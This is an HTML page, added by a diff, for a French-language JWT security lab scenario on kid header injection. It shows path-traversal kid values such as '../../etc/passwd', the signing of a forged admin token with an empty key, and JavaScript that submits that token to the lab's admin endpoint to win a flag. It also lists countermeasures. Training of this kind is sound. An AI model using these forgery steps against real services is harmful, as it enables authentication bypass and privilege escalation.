@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scénario 4 — kid Header Injection</title>
+<style>
+  :root { --bg-global:#0B0F14; --bg-header:#0F1A2B; --bg-card:#141B26; --btn-primary:#D41414; --btn-primary-hover:#FF2A2A; --glow-color:#00C2FF; --text-primary:#F2F4F8; --text-secondary:#8A8F98; --border:#1E2A3A; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg-global); color:var(--text-primary); font-family:'Segoe UI',system-ui,sans-serif; min-height:100vh; }
+  header { background:var(--bg-header); border-bottom:1px solid var(--border); padding:1rem 2rem; display:flex; align-items:center; gap:1rem; }
+  header a { color:var(--glow-color); text-decoration:none; font-size:0.85rem; }
+  main { max-width:900px; margin:0 auto; padding:2rem; }
+  h2 { font-size:1.6rem; margin-bottom:0.5rem; }
+  h2 span { color:var(--glow-color); }
+  .subtitle { color:var(--text-secondary); margin-bottom:2rem; line-height:1.5; }
+  .panel { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .panel h3 { font-size:1rem; margin-bottom:1rem; color:var(--glow-color); }
+  .theory { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .theory p { color:var(--text-secondary); font-size:0.88rem; line-height:1.6; }
+  .code { background:#0a0a0a; border:1px solid #222; border-radius:8px; padding:1rem; font-family:'Courier New',monospace; font-size:0.78rem; margin:0.8rem 0; overflow-x:auto; white-space:pre; color:#a0f0a0; }
+  label { display:block; font-size:0.85rem; color:var(--text-secondary); margin-bottom:0.4rem; margin-top:0.8rem; }
+  input { width:100%; background:#0F1A2B; border:1px solid var(--border); color:var(--text-primary); padding:0.6rem 0.8rem; border-radius:6px; font-size:0.9rem; }
+  .btn { display:inline-block; background:var(--btn-primary); color:white; padding:0.65rem 1.4rem; border-radius:6px; font-weight:600; font-size:0.9rem; cursor:pointer; border:none; width:100%; margin-top:1rem; transition:background 0.2s; }
+  .btn:hover { background:var(--btn-primary-hover); }
+  .result { margin-top:1rem; padding:1rem; border-radius:8px; font-size:0.85rem; display:none; word-break:break-all; }
+  .result.success { background:#001A15; border:1px solid #00AA77; color:#00FF99; display:block; }
+  .result.error { background:#1A0000; border:1px solid #AA0000; color:#FF6666; display:block; }
+  .result.info { background:#001220; border:1px solid #003366; color:#66AAFF; display:block; }
+  .flag { background:#001A15; border:1px solid #00AA77; border-radius:8px; padding:1rem; margin-top:1rem; font-family:monospace; color:#00FF99; font-size:0.9rem; text-align:center; display:none; }
+  .hint { background:#1A1500; border:1px solid #554400; border-radius:8px; padding:1rem; margin-top:1rem; font-size:0.82rem; color:#FFCC44; }
+  .layout { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; }
+  .keystore { background:#0a0a0a; border:1px solid #222; border-radius:8px; padding:1rem; font-family:'Courier New',monospace; font-size:0.8rem; margin:0.5rem 0; }
+  .keystore-row { display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid #1a1a1a; }
+  .keystore-row:last-child { border-bottom:none; }
+  .key-name { color:#FFB800; }
+  .key-val { color:#FF6666; }
+  .attack-box { border:2px dashed var(--btn-primary); border-radius:8px; padding:1rem; margin-top:0.5rem; }
+  .attack-box p { font-size:0.82rem; color:var(--text-secondary); margin-bottom:0.5rem; }
+</style>
+</head>
+<body>
+<header>
+  <a href="/">← Retour au lab</a>
+  <h1 style="font-size:1.2rem;">🔐 Scénario 4 — <span style="color:var(--glow-color)">kid Header Injection</span></h1>
+</header>
+<main>
+  <h2>kid <span>Header Injection</span></h2>
+  <p class="subtitle">Le paramètre <code>kid</code> (Key ID) dans le header JWT indique quelle clé utiliser pour vérifier la signature. Si ce paramètre n'est pas validé, un attaquant peut injecter un chemin arbitraire pour forcer l'utilisation d'une clé vide ou contrôlée.</p>
+
+  <div class="theory">
+    <h3 style="color:var(--glow-color); margin-bottom:0.8rem;">📚 Comment fonctionne le kid ?</h3>
+    <p>Le serveur utilise un keystore interne :</p>
+    <div class="keystore">
+      <div class="keystore-row"><span class="key-name">key-prod</span><span class="key-val">→ "s3cr3t_pr0d_k3y"</span></div>
+      <div class="keystore-row"><span class="key-name">key-dev</span><span class="key-val">→ "devkey"</span></div>
+    </div>
+    <p style="margin-top:0.8rem;">Le serveur lit le <code>kid</code> du header et cherche la clé correspondante. Si <code>kid = "../../etc/passwd"</code> ou <code>kid = "../nonexistent"</code>, le serveur peut charger un fichier vide → signature avec chaîne vide !</p>
+    <div class="code">// Header JWT manipulé :
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../config/empty"   ← path traversal !
+}
+
+// Résultat : serveur utilise clé vide "" pour vérifier
+// L'attaquant signe son token avec "" → accès admin</div>
+  </div>
+
+  <div class="layout">
+    <div class="panel">
+      <h3>Étape 1 — Se connecter</h3>
+      <label>Utilisateur</label>
+      <input type="text" id="s4-user" value="alice">
+      <label>Mot de passe</label>
+      <input type="password" id="s4-pass" value="password123">
+      <button class="btn" onclick="s4Login()">Se connecter</button>
+      <div class="result" id="s4-login-result"></div>
+    </div>
+    <div class="panel">
+      <h3>Analyser le token</h3>
+      <label>Token JWT à analyser</label>
+      <input type="text" id="s4-analyze-token" placeholder="Collez le token...">
+      <button class="btn" style="background:#1A2A3A; color:var(--glow-color); border:1px solid var(--border);" onclick="s4Analyze()">🔍 Décoder le header</button>
+      <div class="result" id="s4-analyze-result"></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h3>Étape 2 — Forger un token avec kid malicieux</h3>
+    <div class="attack-box">
+      <p>⚠️ On va créer un token avec <code>kid: "../../nonexistent"</code> (path traversal) pour forcer l'utilisation d'une clé vide, puis signer avec la chaîne vide <code>""</code></p>
+    </div>
+    <label>Valeur du kid à injecter</label>
+    <input type="text" id="s4-kid" value="../../nonexistent">
+    <label>Rôle à forger</label>
+    <input type="text" id="s4-role" value="admin">
+    <button class="btn" onclick="s4Forge()">🔧 Forger token avec kid malicieux</button>
+    <div class="result" id="s4-forge-result"></div>
+  </div>
+
+  <div class="panel">
+    <h3>Étape 3 — Accéder à la zone admin</h3>
+    <label>Token forgé</label>
+    <input type="text" id="s4-forged-token" placeholder="Token avec kid injecté...">
+    <button class="btn" onclick="s4Attack()">🚀 Tenter l'accès admin</button>
+    <div class="result" id="s4-attack-result"></div>
+    <div class="flag" id="s4-flag"></div>
+  </div>
+
+  <div class="hint">
+    💡 <strong>Contre-mesures :</strong> Valider le <code>kid</code> via une whitelist, ne jamais utiliser le kid comme chemin de fichier, et utiliser une base de données pour stocker les clés. Variantes : <code>jku</code> (URL injection), <code>x5u</code> injection.
+  </div>
+</main>
+
+<script>
+async function s4Login() {
+  const res = await fetch('/scenario4/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: document.getElementById('s4-user').value, password: document.getElementById('s4-pass').value }) });
+  const data = await res.json();
+  const el = document.getElementById('s4-login-result');
+  if (data.success) {
+    el.className = 'result success';
+    el.innerHTML = `✅ ${data.message}<br><small>${data.token}</small>`;
+    document.getElementById('s4-analyze-token').value = data.token;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + data.message;
+  }
+}
+
+function s4Analyze() {
+  const token = document.getElementById('s4-analyze-token').value.trim();
+  if (!token) return;
+  try {
+    const parts = token.split('.');
+    const header = JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
+    const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+    const el = document.getElementById('s4-analyze-result');
+    el.className = 'result info';
+    el.innerHTML = `<strong>Header:</strong> ${JSON.stringify(header, null, 2)}<br><br><strong>Payload:</strong> ${JSON.stringify(payload, null, 2)}`;
+  } catch(e) {
+    document.getElementById('s4-analyze-result').className = 'result error';
+    document.getElementById('s4-analyze-result').textContent = 'Erreur de décodage';
+  }
+}
+
+function s4Forge() {
+  const kid = document.getElementById('s4-kid').value;
+  const role = document.getElementById('s4-role').value;
+  
+  // Header avec kid malicieux
+  const header = btoa(JSON.stringify({alg:'HS256', typ:'JWT', kid: kid})).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+  const payload = btoa(JSON.stringify({username:'admin', role: role, iat: Math.floor(Date.now()/1000)})).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+  // Signature avec clé vide (le serveur utilisera "" comme secret)
+  // En production: jwt.sign(payload, '', {algorithm: 'HS256', header: {kid: '../../nonexistent'}})
+  const fakeToken = `${header}.${payload}.SIGNED_WITH_EMPTY_KEY`;
+  
+  const el = document.getElementById('s4-forge-result');
+  el.className = 'result info';
+  el.innerHTML = `🔧 Token forgé avec kid="${kid}" :<br><small>${fakeToken}</small><br><br>ℹ️ En production, signez avec <code>jwt.sign(payload, '', {algorithm:'HS256', header:{kid:'${kid}'}})</code>`;
+  document.getElementById('s4-forged-token').value = fakeToken;
+}
+
+async function s4Attack() {
+  const token = document.getElementById('s4-forged-token').value.trim();
+  if (!token) { alert('Forgez d\'abord le token !'); return; }
+  const res = await fetch('/scenario4/admin', { method:'POST', headers:{'Authorization':'Bearer '+token} });
+  const data = await res.json();
+  const el = document.getElementById('s4-attack-result');
+  if (data.success) {
+    el.className = 'result success';
+    el.textContent = '✅ ' + data.message;
+    const flag = document.getElementById('s4-flag');
+    flag.style.display = 'block';
+    flag.textContent = '🏴 ' + data.flag;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + data.message;
+  }
+}
+</script>
+</body>
+</html>
